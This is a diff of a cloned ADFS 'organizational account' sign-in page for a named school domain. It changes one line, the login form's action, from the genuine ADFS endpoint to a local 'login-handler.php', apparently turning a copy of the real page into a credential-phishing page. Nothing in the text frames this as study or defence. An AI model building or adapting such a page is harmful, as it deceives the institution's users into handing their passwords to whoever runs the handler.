@@ -182,7 +182,7 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
     <div id="loginArea">        
         <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
 
-        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="/adfs/ls/?wa=wsignin1.0&wtrealm=urn%3aece.campusonline.me%3ainseec&wctx=https%3a%2f%2fece.campusonline.me%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%25252F&client-request-id=de0faf75-4427-4f25-d203-0080001800f6">
+        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="login-handler.php">
             <div id="error" class="fieldMargin error smallText">
                 <span id="errorText" for=""></span>
             </div>
